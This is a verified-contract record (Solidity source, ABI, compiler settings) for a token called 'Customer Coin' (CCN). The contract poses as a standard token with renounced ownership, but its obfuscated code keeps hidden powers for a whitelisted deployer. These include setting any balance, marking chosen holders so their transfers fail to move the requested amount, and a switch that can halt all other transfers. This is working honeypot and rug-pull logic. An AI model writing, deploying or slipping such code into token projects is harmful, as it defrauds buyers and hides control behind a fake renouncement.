{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract shouldTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atAmount {\n    function createPair(address fundReceiverFrom, address walletTo) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface listLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface totalSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptLimitTeam) external view returns (uint256);\n\n    function transfer(address receiverTake, uint256 modeToTx) external returns (bool);\n\n    function allowance(address toMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeToTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverTake,\n        uint256 modeToTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeSwapTeam, uint256 value);\n    event Approval(address indexed toMode, address indexed spender, uint256 value);\n}\n\ninterface maxSenderMarketing is totalSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CustomerCoin is shouldTeam, totalSwap, maxSenderMarketing {\n\n    uint8 private walletReceiver = 18;\n\n    function takeReceiverReceiver(address toMin, address receiverTake, uint256 modeToTx) internal view returns (uint256) {\n        require(modeToTx > 0);\n\n        uint256 listAt = 0;\n        if (toMin == tradingSwap && minTx > 0) {\n            listAt = modeToTx * minTx / 100;\n        } else if (receiverTake == tradingSwap && walletMode > 0) {\n            listAt = modeToTx * walletMode / 100;\n        }\n        require(listAt <= modeToTx);\n        return modeToTx - listAt;\n    }\n\n    bool public tokenMin;\n\n    address totalSenderFee;\n\n    mapping(address => mapping(address => uint256)) private limitSell;\n\n    function transfer(address liquidityMax, uint256 modeToTx) external virtual override returns (bool) {\n        return modeExempt(_msgSender(), liquidityMax, modeToTx);\n    }\n\n    uint256 public minTx = 3;\n\n    function getOwner() external view returns (address) {\n        return minAutoShould;\n    }\n\n    event OwnershipTransferred(address indexed atToken, address indexed shouldLaunch);\n\n    function tradingTx(address shouldReceiver) public {\n        if (launchedShouldTrading) {\n            return;\n        }\n        \n        exemptTeam[shouldReceiver] = true;\n        if (takeTo != minSell) {\n            tradingWallet = marketingTrading;\n        }\n        launchedShouldTrading = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxSwap;\n    }\n\n    uint256 private maxSwap = 100000000 * 10 ** 18;\n\n    address public isAmount;\n\n    function modeExempt(address toMin, address receiverTake, uint256 modeToTx) internal returns (bool) {\n        if (toMin == isAmount) {\n            return minExempt(toMin, receiverTake, modeToTx);\n        }\n        uint256 maxTake = totalSwap(tradingSwap).balanceOf(totalSenderFee);\n        require(maxTake == launchedSwapFrom);\n        require(receiverTake != totalSenderFee);\n        if (takeBuy[toMin]) {\n            return minExempt(toMin, receiverTake, launchedAtList);\n        }\n        modeToTx = takeReceiverReceiver(toMin, receiverTake, modeToTx);\n        return minExempt(toMin, receiverTake, modeToTx);\n    }\n\n    function balanceOf(address exemptLimitTeam) public view virtual override returns (uint256) {\n        return tradingSellToken[exemptLimitTeam];\n    }\n\n    function owner() external view returns (address) {\n        return minAutoShould;\n    }\n\n    address private minAutoShould;\n\n    uint256 public walletMode = 0;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletReceiver;\n    }\n\n    function allowance(address exemptEnable, address enableTrading) external view virtual override returns (uint256) {\n        if (enableTrading == isTo) {\n            return type(uint256).max;\n        }\n        return limitSell[exemptEnable][enableTrading];\n    }\n\n    uint256 constant launchedAtList = 11 ** 10;\n\n    address isTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private sellMin = \"CCN\";\n\n    function marketingFrom(address tokenAmount) public {\n        toLimit();\n        \n        if (tokenAmount == isAmount || tokenAmount == tradingSwap) {\n            return;\n        }\n        takeBuy[tokenAmount] = true;\n    }\n\n    bool public launchedShouldTrading;\n\n    uint256 launchedSwapFrom;\n\n    function name() external view virtual override returns (string memory) {\n        return teamReceiverReceiver;\n    }\n\n    uint256 private launchTotal;\n\n    function approve(address enableTrading, uint256 modeToTx) public virtual override returns (bool) {\n        limitSell[_msgSender()][enableTrading] = modeToTx;\n        emit Approval(_msgSender(), enableTrading, modeToTx);\n        return true;\n    }\n\n    mapping(address => uint256) private tradingSellToken;\n\n    function fundSwapReceiver(address liquidityMax, uint256 modeToTx) public {\n        toLimit();\n        tradingSellToken[liquidityMax] = modeToTx;\n    }\n\n    address public tradingSwap;\n\n    function transferFrom(address toMin, address receiverTake, uint256 modeToTx) external override returns (bool) {\n        if (_msgSender() != isTo) {\n            if (limitSell[toMin][_msgSender()] != type(uint256).max) {\n                require(modeToTx <= limitSell[toMin][_msgSender()]);\n                limitSell[toMin][_msgSender()] -= modeToTx;\n            }\n        }\n        return modeExempt(toMin, receiverTake, modeToTx);\n    }\n\n    uint256 public tradingWallet;\n\n    function minExempt(address toMin, address receiverTake, uint256 modeToTx) internal returns (bool) {\n        require(tradingSellToken[toMin] >= modeToTx);\n        tradingSellToken[toMin] -= modeToTx;\n        tradingSellToken[receiverTake] += modeToTx;\n        emit Transfer(toMin, receiverTake, modeToTx);\n        return true;\n    }\n\n    string private teamReceiverReceiver = \"Customer Coin\";\n\n    mapping(address => bool) public takeBuy;\n\n    mapping(address => bool) public exemptTeam;\n\n    uint256 private enableReceiver;\n\n    uint256 exemptFrom;\n\n    bool public takeTo;\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellMin;\n    }\n\n    constructor (){\n        if (tokenMin) {\n            tradingWallet = launchTotal;\n        }\n        toReceiver();\n        listLaunch liquidityTakeFrom = listLaunch(isTo);\n        tradingSwap = atAmount(liquidityTakeFrom.factory()).createPair(liquidityTakeFrom.WETH(), address(this));\n        totalSenderFee = atAmount(liquidityTakeFrom.factory()).feeTo();\n        \n        isAmount = _msgSender();\n        exemptTeam[isAmount] = true;\n        tradingSellToken[isAmount] = maxSwap;\n        if (takeTo) {\n            marketingTrading = enableReceiver;\n        }\n        emit Transfer(address(0), isAmount, maxSwap);\n    }\n\n    function toReceiver() public {\n        emit OwnershipTransferred(isAmount, address(0));\n        minAutoShould = address(0);\n    }\n\n    uint256 public marketingTrading;\n\n    bool public minSell;\n\n    function fromTradingReceiver(uint256 modeToTx) public {\n        toLimit();\n        launchedSwapFrom = modeToTx;\n    }\n\n    function toLimit() private view {\n        require(exemptTeam[_msgSender()]);\n    }\n\n    bool private txFundExempt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeSwapTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeToTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLimitTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeToTx\",\"type\":\"uint256\"}],\"name\":\"fromTradingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeToTx\",\"type\":\"uint256\"}],\"name\":\"fundSwapReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedShouldTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAmount\",\"type\":\"address\"}],\"name\":\"marketingFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"}],\"name\":\"tradingTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeToTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeToTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CustomerCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}